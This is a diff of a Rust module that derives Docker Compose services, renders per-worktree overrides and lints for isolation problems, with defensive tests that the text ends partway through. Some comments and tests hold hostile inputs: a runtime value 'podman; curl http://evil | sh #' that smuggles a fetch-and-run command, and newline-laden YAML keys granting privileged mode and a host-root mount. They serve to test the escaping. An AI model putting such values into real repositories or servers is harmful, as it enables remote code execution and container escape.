@@ -1,22 +1,9 @@
-//! Auto-derive a repo's `services` from its compose file.
+//! Auto-derive a repo's `services` from its compose file. See `ARCHITECTURE.md`
+//! for how this fits the `ws up` flow.
 //!
-//! For a container repo, `ws up`/`ws new` runs `<runtime> compose config
-//! --format json` in the worktree — the authoritative view, since compose does
-//! its own file discovery and applies env interpolation / `extends` / anchors /
-//! overrides — and turns each published container port into a `ServiceConfig`.
-//! The `.ws.json` `services` block is then overlaid on top (see
-//! `inject::effective_services`), so a stale block is never *wrong*, only less
-//! customized.
-//!
-//! **One entry per (service, port).** A compose service can publish several
-//! ports (mailpit = SMTP 1025 + UI 8025); each becomes its own derived service —
-//! `<svc>` when the service has a single derived port, `<svc>_<port>` (underscore
-//! so the `WS_PORT_*` env name stays shell-clean) when it has more than one.
-//!
-//! **Conservative HTTP classification.** Only container port 80 or 443 is routed
-//! as HTTP (`subdomain = service name`); everything else is raw TCP (allocated a
-//! host port). Widen via the `.ws.json` override, not here — mis-marking a raw
-//! service HTTP would have Caddy try to HTTP-proxy a non-HTTP protocol.
+//! Only container port 80/443 is classified HTTP; everything else is raw TCP.
+//! Widen via the `.ws.json` override, not here — mis-marking a raw service HTTP
+//! would have Caddy try to HTTP-proxy a non-HTTP protocol.
 
 use anyhow::{Context, Result};
 use serde::Deserialize;
@@ -28,27 +15,21 @@ use crate::caddy::WS_NET;
 use crate::config::{HttpDecl, ServiceConfig};
 use crate::remote::{self, Site};
 
-/// Compose files `compose config` discovers, in the order it prefers them. Used
-/// only to *infer* whether a repo is a container repo when `kind` is unset;
-/// `compose config` itself does the real discovery.
+/// In compose's own preference order — `base_files` takes the first present as
+/// the primary.
 const COMPOSE_FILES: &[&str] =
     &["compose.yaml", "compose.yml", "docker-compose.yaml", "docker-compose.yml"];
 
-/// Whether `dir` looks like a compose project (used for `kind` inference).
 pub fn has_compose_file(dir: &Path) -> bool {
     COMPOSE_FILES.iter().any(|f| dir.join(f).is_file())
 }
 
-/// The base compose file(s) compose would discover in `worktree`, as absolute
-/// paths: the primary file (first of `COMPOSE_FILES` present) plus its
-/// auto-merged `<family>.override.{yaml,yml}` sibling if one exists. Empty when
-/// no compose file is present. These lead the `COMPOSE_FILE` list, ahead of our
-/// generated override — once `COMPOSE_FILE` is set, compose no longer
-/// auto-discovers, so the base file has to be named for the merge to include it.
+/// The base compose file(s) to lead the `COMPOSE_FILE` list with: once
+/// `COMPOSE_FILE` is set compose stops auto-discovering, so they have to be
+/// named explicitly for the merge to include them.
 ///
-/// The override sibling is matched to the *primary's family* (`compose.*` →
-/// `compose.override.*`, `docker-compose.*` → `docker-compose.override.*`) —
-/// compose only merges the matching family, so pairing a `compose.yaml` with a
+/// The `.override.` sibling is matched to the *primary's family* — compose only
+/// merges the matching one, so pairing a `compose.yaml` with a
 /// `docker-compose.override.yml` would apply an override the project never had.
 pub fn base_files(worktree: &Path) -> Vec<PathBuf> {
     let mut files = Vec::new();
@@ -67,12 +48,9 @@ pub fn base_files(worktree: &Path) -> Vec<PathBuf> {
     files
 }
 
-/// A legal compose project name for a worktree: `<branch>-<repo>` lowercased,
-/// with every character outside `[a-z0-9_-]` replaced by `-` and a leading run
-/// of non-alphanumerics dropped. Compose requires `COMPOSE_PROJECT_NAME` to
-/// match `[a-z0-9][a-z0-9_-]*` and rejects anything else, but `sanitize_branch`
-/// only strips slashes — so an uppercase or dotted branch (`Feat/JIRA-1.2`)
-/// would otherwise break `up` *and* `down`.
+/// Compose rejects a `COMPOSE_PROJECT_NAME` outside `[a-z0-9][a-z0-9_-]*`, and
+/// `sanitize_branch` only strips slashes — so an uppercase or dotted branch
+/// (`Feat/JIRA-1.2`) would otherwise break `up` *and* `down`.
 pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
     let mut s: String = format!("{branch_sanitized}-{repo}")
         .chars()
@@ -87,10 +65,8 @@ pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
     if s.is_empty() { "ws".to_string() } else { s }
 }
 
-/// Generate the per-worktree compose override at `path` (on `site`) from the
-/// current allocation, or remove a now-stale one. Returns `true` when a file was
-/// written (so the caller adds it to `COMPOSE_FILE`), `false` when there was
-/// nothing to override. For a remote stack the file is streamed to the server.
+/// Returns `true` when a file was written, so the caller adds it to
+/// `COMPOSE_FILE`.
 pub fn write_override(
     site: &Site,
     path: &str,
@@ -106,45 +82,34 @@ pub fn write_override(
             Ok(true)
         }
         None => {
-            // Drop an override left by a prior `up` that no longer applies, so a
-            // later read-only phase can't reference a stale file.
+            // Drop an override a prior `up` left, so a later read-only phase
+            // can't reference a stale file.
             site.remove_file(path);
             Ok(false)
         }
     }
 }
 
-/// The `ports:` directive to emit for a service. A service that needs no ports
-/// line (base ports left alone) simply gets no entry in the `ports` map.
+/// A service absent from the `ports` map keeps its committed `ports:` untouched.
 enum PortsDirective {
-    /// `ports: !reset []` — drop the host publish entirely (Caddy routes it).
     Reset,
-    /// `ports: !override [...]` — replace the whole list with these
-    /// `host:internal` reissues.
     Override(Vec<(u16, u16)>),
 }
 
-/// What the override does to one real compose service.
 #[derive(Default)]
 struct ServicePlan {
-    /// The service publishes an HTTP port (80/443) that Caddy fronts.
     is_http: bool,
-    /// Allocated host ports to republish for this service's raw-TCP ports.
+    /// `(host, internal)` pairs.
     reissue: Vec<(u16, u16)>,
 }
 
-/// Render the compose override: a `ports:` directive per service plus the
-/// declared `env` materialized as `environment:` entries (a shell env doesn't
-/// cross into a container). `None` when there's nothing to emit.
+/// Declared `env` is materialized as `environment:` because a shell env doesn't
+/// cross into a container.
 ///
-/// `join_ws_net` (routing active) is the **6.2b flip**: HTTP services join the
-/// shared `ws-net` so the containerized Caddy can dial them, and their host
-/// publish is dropped (`ports: !reset []`, or `!override` with just the raw
-/// reissue for a service that mixes an HTTP and a raw-TCP port) — after this an
-/// HTTP service is reachable *only* through Caddy. When `join_ws_net` is false
-/// (no `domain` / remote) this is the standalone form: raw-TCP `!override` + env,
-/// HTTP services left publishing their host ports (there's no Caddy to route
-/// them, so dropping the publish would strand them).
+/// `join_ws_net` means routing is active (`domain` is set): HTTP services join
+/// the shared `ws-net` so the containerized Caddy can dial them, and give up
+/// their host publish. Without it, HTTP services keep publishing — nothing
+/// routes them, so dropping the publish would only strand them.
 fn render_override(
     services: &BTreeMap<String, ServiceConfig>,
     all_services: &BTreeSet<String>,
@@ -152,10 +117,8 @@ fn render_override(
     env: &[(String, String)],
     join_ws_net: bool,
 ) -> Option<String> {
-    // Aggregate the effective services by real compose service name — a
-    // multi-port compose service derives as several `<svc>_<port>` keys that all
-    // fold back onto one service block (a `ports:` directive replaces the whole
-    // list, so a service's ports must be planned together).
+    // A `ports:` directive replaces the whole list, so the several `<svc>_<port>`
+    // keys a multi-port service derives as must be planned as one block.
     let mut plans: BTreeMap<String, ServicePlan> = BTreeMap::new();
     for (key, svc) in services {
         let plan = plans.entry(compose_service(key, svc.port).to_string()).or_default();
@@ -166,16 +129,10 @@ fn render_override(
         }
     }
 
-    // Decide each service's ports directive and whether it joins `ws-net`. A
-    // service left publishing its base ports gets no `ports` entry at all.
     let mut ports: BTreeMap<String, PortsDirective> = BTreeMap::new();
     let mut join: BTreeSet<String> = BTreeSet::new();
     for (name, plan) in &plans {
         if plan.is_http && join_ws_net {
-            // Routing active: this HTTP service is dialed by Caddy over `ws-net`,
-            // so drop its host publish. A pure-HTTP service resets to nothing; a
-            // service that also has a raw-TCP port keeps only that (reissued),
-            // which `!override` expresses in one replacement.
             join.insert(name.clone());
             let directive = if plan.reissue.is_empty() {
                 PortsDirective::Reset
@@ -184,11 +141,9 @@ fn render_override(
             };
             ports.insert(name.clone(), directive);
         } else if plan.is_http {
-            // No routing (standalone form): leave HTTP (and mixed HTTP+raw)
-            // services publishing their host ports — nothing routes them yet, so
-            // dropping the publish would only strand them. (No `ports` entry.)
+            // Deliberately empty: with no Caddy to route them, HTTP (and mixed
+            // HTTP+raw) services must keep publishing or they're unreachable.
         } else if !plan.reissue.is_empty() {
-            // Raw-TCP-only service: republish on the allocated host port(s).
             ports.insert(name.clone(), PortsDirective::Override(plan.reissue.clone()));
         }
     }
@@ -197,13 +152,9 @@ fn render_override(
         return None;
     }
 
-    // Services needing an entry: those with a ports directive (which already
-    // includes every ws-net join — a joined service always gets one), plus —
-    // when there's declared env — every compose service. The `env` block is
-    // repo-level, so it goes to the whole stack; compose merges it into each
-    // service's own `environment`. Note this uses `all_services`, NOT `plans`:
-    // plans only holds services `ws` derived a port for, and the container the
-    // app actually runs in is often portless (php-fpm behind nginx).
+    // Env goes to `all_services`, not just `plans`: plans only holds services a
+    // port was derived for, and the container the app actually runs in is often
+    // portless (php-fpm behind nginx).
     let mut names: BTreeSet<String> = ports.keys().cloned().collect();
     if !env.is_empty() {
         names.extend(plans.keys().cloned());
@@ -243,45 +194,28 @@ fn render_override(
     Some(out)
 }
 
-/// Recover the real compose service name from a derived service key: a
-/// single-port service keeps its bare name, a multi-port one derives as
-/// `<svc>_<internal-port>`, so strip a trailing `_<port>`. (A service literally
+/// Recover the real compose service name from a derived key. A service literally
 /// named `<x>_<port>` publishing that port collides here — the same accepted
-/// ambiguity `derive` already carries.)
+/// ambiguity `derive_service` creates.
 pub(crate) fn compose_service(key: &str, internal_port: u16) -> &str {
     key.strip_suffix(&format!("_{internal_port}")).unwrap_or(key)
 }
 
-/// Escape `$` as `$$` for Compose's own variable interpolation, which runs
-/// *after* YAML parsing. `ws` has already substituted every `${WS_*}` token it
-/// knows; anything with a residual `$` — an unresolved cross-repo token (a peer
-/// not yet built), or a literal `$` in a declared value — must be passed through
-/// untouched, or Compose tries to interpolate it and aborts the whole `up`
-/// (`invalid interpolation format … escape any $ with another $`). A fully
-/// resolved value has no `$` and is unaffected.
+/// Compose interpolates variables *after* YAML parsing, so a residual `$` — an
+/// unresolved cross-repo token, or a literal `$` in a declared value — aborts
+/// the whole `up` unless doubled.
 fn compose_escape(v: &str) -> String {
     v.replace('$', "$$")
 }
 
-/// Emit `k` as a YAML **mapping key**: bare when it's a plain unambiguous scalar
-/// (`[A-Za-z0-9_][A-Za-z0-9_.-]*` — every legal env var name and compose service
-/// name), double-quoted otherwise. Same quote-only-when-unsafe shape as
-/// `remote::shell_quote`, so ordinary config renders exactly as it always has.
-///
-/// Both keys we emit are `.ws.json`-controlled — declared `env` names, and
-/// compose service names, which the `services` block can introduce — and a JSON
-/// string can carry a newline. Written raw, a key like
-///
-/// ```text
-/// X: "1"\n    privileged: true\n    volumes:\n      - "/:/host"\n    labels
-/// ```
-///
-/// closes the `environment:` map and dedents back to service level, so the
-/// generated override grants every service in the stack `privileged: true` with
-/// the host root bind-mounted — directives the repo's *committed* compose file
-/// never contained, applied on the next `ws up` locally or on the offload
-/// server. Quoting keeps a hostile key one scalar, exactly as the value side has
-/// always been kept.
+/// Security invariant. Both key kinds we emit — declared `env` names and compose
+/// service names — come from `.ws.json`, which is not gitignored and so arrives
+/// with a clone, and a JSON string can carry a newline. Written raw, such a key
+/// closes the `environment:` map and dedents back to service level, granting
+/// every service in the stack directives (`privileged: true`, a host-root bind
+/// mount) the committed compose file never contained. Quoting keeps it one
+/// scalar. The plain set is deliberately narrow but covers every legal env var
+/// and compose service name, so ordinary config still renders bare.
 fn yaml_key(k: &str) -> String {
     let mut chars = k.chars();
     let plain = chars.next().is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
@@ -289,17 +223,9 @@ fn yaml_key(k: &str) -> String {
     if plain { k.to_string() } else { yaml_dquote(k) }
 }
 
-/// Double-quote a YAML scalar, escaping `\`, `"`, and the control characters
-/// that would otherwise break a single-line double-quoted scalar. Env values
-/// are normally URLs/ports (the `:`/`/` are safe once quoted), but a declared
-/// value could contain a newline/tab; emit those as YAML escapes rather than a
-/// raw byte that would corrupt the document.
-///
-/// The catch-all arm covers the rest of the control range and the Unicode
-/// line/paragraph separators: YAML 1.1 parsers treat U+0085/2028/2029 as line
-/// breaks, so a raw one inside the quotes would end the scalar's line. Since
-/// `yaml_key` quotes hostile *keys* through here too, every character that could
-/// re-open the document has to come out as an escape, not a raw byte.
+/// `yaml_key` routes hostile keys through here, so every character that could
+/// re-open the document has to leave as an escape rather than a raw byte. That
+/// includes U+0085/2028/2029, which YAML 1.1 parsers treat as line breaks.
 fn yaml_dquote(v: &str) -> String {
     let mut out = String::with_capacity(v.len() + 2);
     out.push('"');
@@ -324,33 +250,24 @@ fn yaml_dquote(v: &str) -> String {
     out
 }
 
-/// Derive services from `<runtime> compose config --format json` run in
-/// `worktree` at `site` (the server, for a remote stack). Errors if the runtime
-/// is missing, there's no compose file, or the output doesn't parse — callers
-/// fall back to the declared `services`. `worktree` is the path *at the site*
-/// (the local worktree, or the server-side synced dir).
+/// `worktree` is the path *at the site* — the local worktree, or the
+/// server-side synced dir.
 pub fn derive(site: &Site, runtime: &str, worktree: &str) -> Result<Derived> {
     parse(&compose_config_json(site, runtime, worktree, false)?)
 }
 
-/// What a `compose config` derive yields: the port-bearing services `ws` models,
-/// plus **every** compose service name. The two differ — `derive_service` keys off
-/// published ports, so a portless service (a php-fpm `app` behind an nginx `web`)
-/// has no `ServiceConfig` — and declared `env` must still reach it, since that's
-/// usually exactly where the application code runs.
+/// `names` is wider than `services`: a portless service (a php-fpm `app` behind
+/// an nginx `web`) gets no `ServiceConfig`, yet is usually exactly where the
+/// application code runs, so declared `env` must still reach it.
 pub struct Derived {
     pub services: BTreeMap<String, ServiceConfig>,
-    /// Every service name in `compose config` output, ports or not.
     pub names: BTreeSet<String>,
 }
 
-/// Run `<runtime> compose config --format json` in `worktree` at `site` and
-/// return its stdout. Locally, `clean_env` strips `ws`'s injected
-/// `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE` so the output reflects the *committed*
-/// project (the linter needs that; the derive path wants the ambient env).
-/// Remotely, the server shell has none of those injected vars anyway, so its view
-/// is always the committed one. The single owner of the invocation both callers
-/// share.
+/// `clean_env` strips `ws`'s own injected `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE`
+/// so the output reflects the *committed* project — the linter needs that, the
+/// derive path wants the ambient env. Remotely it's moot: the server shell never
+/// has those vars.
 fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bool) -> Result<String> {
     let out = match site {
         Site::Local => {
@@ -376,12 +293,10 @@ fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bo
     Ok(String::from_utf8_lossy(&out.stdout).into_owned())
 }
 
-/// The server-side `compose config` command, a raw shell string run over SSH.
-/// BOTH the worktree and the runtime are shell-quoted: `runtime` is a `.ws.json`
-/// field (not gitignored, so a cloned repo can carry a hostile value like
-/// `podman; curl evil | sh #`), and this runs in the server's shell. Quoting
-/// keeps parity with the local `Command::new(runtime)` — an exact program name,
-/// no shell — so a bad value fails as "command not found" instead of injecting.
+/// Security invariant: this runs in the server's shell, and `runtime` is a
+/// `.ws.json` field that arrives with a clone (`podman; curl evil | sh #`).
+/// Quoting keeps parity with the local `Command::new(runtime)` — a bad value
+/// fails as "command not found" instead of injecting.
 fn remote_compose_script(worktree: &str, runtime: &str) -> String {
     format!(
         "cd {} && {} compose config --format json",
@@ -409,8 +324,6 @@ struct ComposePort {
     protocol: Option<String>,
 }
 
-/// Parse `compose config --format json` output into derived services plus the
-/// full set of compose service names.
 fn parse(json: &str) -> Result<Derived> {
     let cfg: ComposeConfig = serde_json::from_str(json).context("parse compose config JSON")?;
     let mut services = BTreeMap::new();
@@ -420,10 +333,8 @@ fn parse(json: &str) -> Result<Derived> {
     Ok(Derived { services, names: cfg.services.keys().cloned().collect() })
 }
 
-/// Expand one compose service into its derived `ServiceConfig` entries.
 fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, ServiceConfig>) {
-    // TCP target ports, deduped and ordered (BTreeSet), split into HTTP-ish
-    // (80/443) and the rest. UDP and anything without a numeric target is ignored.
+    // UDP and anything without a numeric target is deliberately ignored.
     let ports: BTreeSet<u16> = svc
         .ports
         .iter()
@@ -433,8 +344,7 @@ fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, S
     let (http, tcp): (Vec<u16>, Vec<u16>) =
         ports.into_iter().partition(|p| *p == 80 || *p == 443);
 
-    // One HTTP entry per service, dialing plain 80 when present (Caddy fronts TLS
-    // and proxies to it), else 443.
+    // Prefer plain 80: Caddy fronts TLS and proxies to it.
     if !http.is_empty() {
         let dial = if http.contains(&80) { 80 } else { 443 };
         out.insert(
@@ -442,9 +352,7 @@ fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, S
             ServiceConfig { http: Some(HttpDecl::Subdomain(name.to_string())), port: dial, shared: false, wildcard: false },
         );
     }
-    // The bare service name is used only when the service yields exactly one
-    // entry total; otherwise suffix with the port so keys (and `WS_PORT_*` names)
-    // stay distinct.
+    // Suffixing is by underscore so the `WS_PORT_*` env name stays shell-clean.
     let single = http.is_empty() && tcp.len() == 1;
     for p in tcp {
         let key = if single { name.to_string() } else { format!("{name}_{p}") };
@@ -452,29 +360,8 @@ fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, S
     }
 }
 
-// ---------------------------------------------------------------------------
-// Isolation linter
-// ---------------------------------------------------------------------------
-//
-// Per-worktree state isolation is free by default — compose prefixes
-// volumes/networks with the project name, so parallel worktrees get isolated
-// DBs automatically. The linter is a preflight that catches the constructs which
-// *silently opt out* and cross-corrupt worktrees. It's advisory: warn loudly,
-// never block (the constructs may be intentional). Best-effort — a missing
-// runtime / unparseable output yields no findings.
-//
-// It flags only the two constructs `compose config` reports **unambiguously**:
-// a committed `container_name:` and an `external: true` volume. Compose always
-// emits a project-resolved `name` for the project *and* every named volume (a
-// plain `data: {}` becomes `<project>_data`), so those names can't be told apart
-// from a committed pin via `compose config` JSON — checking them would
-// false-positive on every clean project, so we don't. (A committed top-level
-// `name:` is also neutralized anyway: `ws` sets `COMPOSE_PROJECT_NAME`, which
-// wins.)
-
-/// Fields of `compose config --format json` the linter inspects. Map values are
-/// `Option` so a stray `null` entry can't fail the whole parse (the lint is
-/// best-effort and must not go silent on one odd value).
+/// Map values are `Option` so a stray `null` entry can't fail the whole parse
+/// and silently drop real findings.
 #[derive(Deserialize)]
 struct LintDoc {
     #[serde(default)]
@@ -491,23 +378,20 @@ struct LintService {
 
 #[derive(Deserialize)]
 struct LintVolume {
-    /// `external` normalizes to a bool in compose config output, but tolerate the
-    /// older `{name: …}` object form too.
+    /// Normalizes to a bool in compose config output; the older `{name: …}`
+    /// object form is tolerated too.
     #[serde(default)]
     external: Option<serde_json::Value>,
 }
 
-/// Lint a worktree's compose project for isolation opt-outs. Runs
-/// `<runtime> compose config` in `worktree` and returns human-readable warnings.
-/// Empty when the project is clean, has no compose file, or the runtime is
-/// unavailable.
+/// Advisory and best-effort: warn loudly, never block. A missing runtime or
+/// unparseable output yields no findings rather than an error. It is a host-side
+/// static check over the committed files, so it always runs locally even for a
+/// remote stack.
 pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
     if !has_compose_file(worktree) {
         return Vec::new();
     }
-    // The isolation lint is a host-side static check over the (synced) committed
-    // files; it always runs locally (on a host without a runtime it simply yields
-    // nothing — see `compose_config_json`, best-effort, never blocks a caller).
     let Ok(json) = compose_config_json(&Site::Local, runtime, &worktree.to_string_lossy(), true)
     else {
         return Vec::new();
@@ -518,12 +402,15 @@ pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
     }
 }
 
-/// The pure classifier: turn a parsed compose doc into isolation warnings.
+/// Only these two constructs are flagged, because they are the only isolation
+/// opt-outs `compose config` reports unambiguously. Notably absent: the project
+/// `name` and named-volume `name`, which compose resolves and emits for *every*
+/// project (a plain `data: {}` becomes `<project>_data`), so a committed pin is
+/// indistinguishable from a clean one and checking them would warn on everything.
 fn lint_findings(doc: &LintDoc) -> Vec<String> {
     let mut out = Vec::new();
 
-    // `container_name:` pins a fixed name → parallel `up`s collide on it. Compose
-    // emits it only when committed, so this is unambiguous.
+    // Compose emits `container_name` only when it was committed.
     for (svc, s) in &doc.services {
         if let Some(cn) = s.as_ref().and_then(|s| s.container_name.as_deref()) {
             out.push(format!(
@@ -533,8 +420,7 @@ fn lint_findings(doc: &LintDoc) -> Vec<String> {
         }
     }
 
-    // An `external` volume is shared across worktrees → one branch's migration
-    // corrupts another's data. Compose emits `external` only when committed.
+    // Likewise `external` — emitted only when committed.
     for (vol, v) in &doc.volumes {
         if v.as_ref().is_some_and(|v| is_truthy(v.external.as_ref())) {
             out.push(format!(
@@ -547,8 +433,6 @@ fn lint_findings(doc: &LintDoc) -> Vec<String> {
     out
 }
 
-/// Whether a compose `external:` value is set (bool `true`, or the legacy
-/// `{name: …}` object form).
 fn is_truthy(v: Option<&serde_json::Value>) -> bool {
     match v {
         Some(serde_json::Value::Bool(b)) => *b,
@@ -561,8 +445,6 @@ fn is_truthy(v: Option<&serde_json::Value>) -> bool {
 mod tests {
     use super::*;
 
-    // Matches the `compose config --format json` shape: services.<name>.ports[]
-    // = {target, published?, protocol}.
     const SAMPLE: &str = r#"{
       "name": "proj",
       "services": {
@@ -578,33 +460,29 @@ mod tests {
     fn derives_http_tcp_and_multiport() {
         let s = parse(SAMPLE).unwrap().services;
 
-        // web (80+443) → one HTTP entry dialing 80, subdomain = service name.
         let web = &s["web"];
         assert!(matches!(web.http, Some(HttpDecl::Subdomain(ref d)) if d == "web"));
         assert_eq!(web.port, 80);
 
-        // Single raw-TCP ports keep the bare service name.
         assert!(s["db"].http.is_none() && s["db"].port == 3306);
         assert!(s["redis"].http.is_none() && s["redis"].port == 6379);
 
-        // Multi-port service → one entry per port, suffixed, underscore-joined.
         assert_eq!(s["mailpit_1025"].port, 1025);
         assert_eq!(s["mailpit_8025"].port, 8025);
         assert!(s["mailpit_1025"].http.is_none());
         assert!(!s.contains_key("mailpit"), "multi-port must not keep the bare name");
 
-        // `app` publishes nothing (expose-only) → not derived.
+        // `app` is expose-only — publishes nothing, so nothing is derived.
         assert!(!s.contains_key("app"));
     }
 
     #[test]
     fn remote_compose_script_quotes_a_hostile_runtime() {
-        // A `.ws.json` `runtime` carried in a cloned repo must not inject into the
-        // server-side shell: the payload lands inside a single-quoted word.
+        // A `runtime` carried in a cloned repo must not inject into the
+        // server-side shell.
         let s = remote_compose_script("/srv/ws/feat/api", "podman; curl http://evil | sh #");
         assert!(s.contains("'podman; curl http://evil | sh #'"), "runtime not quoted: {s}");
         assert!(s.starts_with("cd /srv/ws/feat/api && "), "{s}");
-        // A benign runtime stays bare (parity with the local `Command::new`).
         assert_eq!(
             remote_compose_script("/w", "podman"),
             "cd /w && podman compose config --format json"
@@ -621,7 +499,6 @@ mod tests {
 
     #[test]
     fn http_service_with_extra_tcp_port_splits() {
-        // web on 80 plus a 9000 metrics port → HTTP `web` + TCP `web_9000`.
         let json = r#"{"services":{"web":{"ports":[
             {"target":80,"protocol":"tcp"},{"target":9000,"protocol":"tcp"}]}}}"#;
         let s = parse(json).unwrap().services;
@@ -650,17 +527,16 @@ mod tests {
         entries.iter().map(|(n, s)| ((*n).into(), s.clone())).collect()
     }
 
-    /// The compose service names for a declared set — what `derive` would return
-    /// alongside it. Tests that don't exercise portless services derive it.
+    /// Stands in for what `derive` would return alongside a declared set; only
+    /// valid for tests that don't exercise portless services.
     fn names(services: &BTreeMap<String, ServiceConfig>) -> BTreeSet<String> {
         services.iter().map(|(k, s)| compose_service(k, s.port).to_string()).collect()
     }
 
     #[test]
     fn declared_env_reaches_a_portless_service() {
-        // The container the app actually runs in is often portless (php-fpm behind
-        // an nginx `web`), so it never enters the derived `services` map. Declared
-        // env must still reach it — otherwise `artisan` reads the stale `.env`.
+        // A portless `app` never enters the derived `services` map, but it is
+        // where the code runs — without env there, `artisan` reads a stale `.env`.
         let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
         let all: BTreeSet<String> =
             ["app", "web", "db"].iter().map(|s| s.to_string()).collect();
@@ -683,14 +559,11 @@ mod tests {
         let out = render_override(&services, &names(&services), &ports, &[], false).expect("some override");
 
         assert!(out.contains("  db:\n    ports: !override\n      - \"20001:3306\""), "{out}");
-        // The HTTP service keeps its host publish in 6.1 (Caddy/`!reset` is 6.2).
         assert!(!out.contains("web:"), "HTTP service must not appear in the override: {out}");
     }
 
     #[test]
     fn override_groups_multiport_service_under_one_entry() {
-        // A multi-port service derives as `<svc>_<port>`; both allocated ports
-        // must land in one `!override` list under the real service name.
         let services = map(&[
             ("mailpit_1025", svc(None, 1025)),
             ("mailpit_8025", svc(None, 8025)),
@@ -716,17 +589,15 @@ mod tests {
         let env = [("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string())];
         let out = render_override(&services, &names(&services), &ports, &env, false).expect("some override");
 
-        // Both real compose services get the env (repo-level `env` → whole stack).
+        // Repo-level `env` goes to the whole stack, not just the ported services.
         assert_eq!(out.matches("APP_URL:").count(), 2, "{out}");
-        // The URL's `:` is safe because the value is double-quoted.
         assert!(out.contains("APP_URL: \"https://feat-x.web.myapp.test\""), "{out}");
     }
 
     #[test]
     fn override_escapes_dollars_so_compose_wont_interpolate_an_unresolved_token() {
-        // A cross-repo `${WS_PORT_app.web}` whose peer isn't built stays literal.
-        // Written raw, docker-compose interpolates it and aborts the whole `up`;
-        // escaped as `$$…`, compose passes `${WS_PORT_app.web}` through untouched.
+        // Written raw, compose interpolates the unresolved token and aborts the
+        // whole `up`; escaped, it passes through untouched.
         let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
         let env = [("SSO".to_string(), "host:${WS_PORT_app.web}/login".to_string())];
         let out = render_override(&services, &names(&services), &BTreeMap::new(), &env, false)
@@ -737,11 +608,9 @@ mod tests {
 
     #[test]
     fn override_quotes_a_hostile_env_key_so_it_cant_inject_service_directives() {
-        // `.ws.json` arrives with a cloned repo, and a JSON key can carry
-        // newlines. Unquoted, this key closes the `environment:` map and dedents
-        // back to service level, handing every service in the stack
-        // `privileged: true` plus the host root — none of which the repo's
-        // committed compose file grants. Quoted, it's one inert scalar.
+        // Unquoted, this key closes the `environment:` map and dedents back to
+        // service level, handing every service `privileged: true` plus the host
+        // root. Quoted, it's one inert scalar.
         let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
         let hostile =
             "X: \"1\"\n    privileged: true\n    volumes:\n      - \"/:/host\"\n    labels";
@@ -763,9 +632,8 @@ mod tests {
 
     #[test]
     fn override_quotes_a_hostile_service_name() {
-        // Same shape one level up: a `.ws.json` `services` key becomes a compose
-        // service name and is emitted as a YAML key too, so a newline in it would
-        // inject a whole extra service block.
+        // Same shape one level up: a `.ws.json` `services` key is emitted as a
+        // YAML key too, so a newline in it injects a whole extra service block.
         let hostile = "web:\n    privileged: true\n  evil";
         let services = map(&[(hostile, svc(None, 3306))]);
         let ports = [(hostile.to_string(), 20001u16)].into_iter().collect();
@@ -783,9 +651,8 @@ mod tests {
 
     #[test]
     fn ordinary_service_names_and_env_keys_stay_bare_keys() {
-        // The key guard must be invisible to real config: compose service names
-        // (which legally carry `-` and `.`) and env var names render exactly as
-        // they did before it existed.
+        // The key guard must stay invisible to real config — compose service
+        // names legally carry `-` and `.`.
         let services = map(&[("api-gateway", svc(None, 8080)), ("mail.relay", svc(None, 1025))]);
         let ports = [("api-gateway".to_string(), 20010u16), ("mail.relay".to_string(), 20011u16)]
             .into_iter()
@@ -814,7 +681,6 @@ mod tests {
 
     #[test]
     fn override_is_none_when_nothing_to_reissue() {
-        // All-HTTP stack, no declared env → nothing for 6.1 to override.
         let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
         assert!(render_override(&services, &names(&services), &BTreeMap::new(), &[], false).is_none());
     }
@@ -827,14 +693,11 @@ mod tests {
         ]);
         let ports = [("db".to_string(), 20001u16)].into_iter().collect();
 
-        // join off → standalone form: db override only, no networks, HTTP web
-        // keeps its host publish (no Caddy to route it).
+        // Join off: HTTP web keeps its host publish, since no Caddy routes it.
         let off = render_override(&services, &names(&services), &ports, &[], false).unwrap();
         assert!(!off.contains("ws-net"), "join off must not touch ws-net:\n{off}");
         assert!(!off.contains("web:"), "HTTP web untouched when routing off:\n{off}");
 
-        // join on (6.2b flip) → web drops its host publish and joins ws-net; db
-        // keeps its raw-TCP reissue; the external net is declared.
         let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
         assert!(
             on.contains("  web:\n    ports: !reset []\n    networks:\n      - default\n      - ws-net\n"),
@@ -846,19 +709,16 @@ mod tests {
 
     #[test]
     fn mixed_http_and_raw_service_keeps_only_the_raw_port_when_routing() {
-        // A service publishing 80 (HTTP) + 9000 (raw) derives as `web` + `web_9000`.
         let services = map(&[
             ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
             ("web_9000", svc(None, 9000)),
         ]);
         let ports = [("web_9000".to_string(), 20005u16)].into_iter().collect();
 
-        // Routing off: leave the whole service's ports alone (dropping the 80
-        // publish would strand it — nothing routes it yet).
+        // Routing off: the whole service is left alone — dropping the 80 publish
+        // would strand it, so the 9000 reissue is given up too.
         assert!(render_override(&services, &names(&services), &ports, &[], false).is_none());
 
-        // Routing on: `!override` with just the raw reissue drops the 80 publish
-        // (Caddy routes it) while keeping 9000 reachable on its allocated port.
         let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
         assert!(
             on.contains("  web:\n    ports: !override\n      - \"20005:9000\"\n    networks:"),
@@ -869,27 +729,20 @@ mod tests {
 
     #[test]
     fn compose_service_keeps_a_legit_underscored_single_port_name() {
-        // Single-port service `my_db` on 3306: derived key is the bare name (no
-        // `_3306` suffix), so it must NOT be stripped. Only the multi-port
-        // `<svc>_<its-own-port>` form is recovered.
         assert_eq!(compose_service("my_db", 3306), "my_db");
